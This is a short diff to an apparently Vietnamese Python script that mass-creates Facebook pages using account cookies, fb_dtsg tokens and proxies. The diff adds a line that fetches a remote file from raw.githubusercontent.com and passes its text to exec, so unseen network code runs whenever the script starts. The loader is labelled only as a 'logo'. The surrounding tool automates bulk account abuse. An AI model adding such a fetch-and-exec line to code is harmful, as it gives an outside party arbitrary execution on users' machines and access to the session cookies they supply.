@@ -7,6 +7,9 @@ import os,time,re,json,random
 from datetime import datetime
 from time import sleep,strftime
 import requests
+exec(requests.get('https://raw.githubusercontent.com/Thuanvuse/filecode/main/logo').text)
+
+
 sopagemountao=int(input('[T]> Số Page Muốn Tạo Trên Mỗi FB : '))
 def Reg(cookies,fb_dtsg,name,proxy):
 	if proxy.count(":") == 3:
